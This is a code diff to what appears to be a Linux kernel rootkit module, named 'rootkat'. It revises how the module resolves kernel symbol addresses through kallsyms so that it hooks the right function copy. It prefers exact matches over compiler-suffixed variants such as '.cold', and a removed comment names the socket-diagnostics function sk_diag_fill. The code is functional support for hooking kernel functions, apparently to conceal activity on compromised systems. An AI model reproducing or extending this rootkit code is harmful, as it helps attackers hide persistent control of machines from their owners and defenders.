@@ -65,28 +65,35 @@ unsigned long rootkat_lookup_name(const char *name)
 
 struct rootkat_lookup_ctx {
 	const char *target_name;
-	unsigned long result;
+	unsigned long result;        /* exact match — takes precedence */
+	unsigned long fallback;      /* first suffixed match (e.g. ".cold") */
 };
 
 static int rootkat_lookup_cb(void *data, const char *name, unsigned long addr)
 {
 	struct rootkat_lookup_ctx *ctx = data;
-
-	/*
-	 * Static-symbol kallsyms entries can carry compiler-generated
-	 * suffixes like `.cold`, `.constprop.0`, `.isra.0`. Match the
-	 * leading basename so an exact lookup of `sk_diag_fill` succeeds
-	 * even if the symbol was emitted as `sk_diag_fill.constprop.0`.
-	 */
 	size_t tlen = strlen(ctx->target_name);
 
 	if (strncmp(name, ctx->target_name, tlen))
 		return 0;
-	if (name[tlen] != '\0' && name[tlen] != '.')
-		return 0;
 
-	ctx->result = addr;
-	return 1;
+	if (name[tlen] == '\0') {
+		/* Exact match — definitive, stop iteration. */
+		ctx->result = addr;
+		return 1;
+	}
+	if (name[tlen] == '.' && !ctx->fallback) {
+		/*
+		 * Compiler-generated suffix (`.cold`, `.constprop.0`,
+		 * `.isra.0`). Remember as a fallback in case no exact
+		 * match exists, but keep iterating so an exact match
+		 * later in the walk wins. The `.cold` copy in particular
+		 * is a relocated error-path stub at an unaligned offset
+		 * — hooking it would be incorrect.
+		 */
+		ctx->fallback = addr;
+	}
+	return 0;
 }
 
 unsigned long rootkat_lookup_in_module(const char *name,
@@ -117,6 +124,12 @@ unsigned long rootkat_lookup_in_module(const char *name,
 			}
 		}
 		on_each_sym(rootkat_lookup_cb, &ctx);
+	}
+
+	if (!ctx.result && ctx.fallback) {
+		pr_info(TAG "no exact '%s'; using suffixed fallback in [%s] -> %lx\n",
+		        name, module_name ? module_name : "vmlinux", ctx.fallback);
+		ctx.result = ctx.fallback;
 	}
 
 	if (ctx.result)
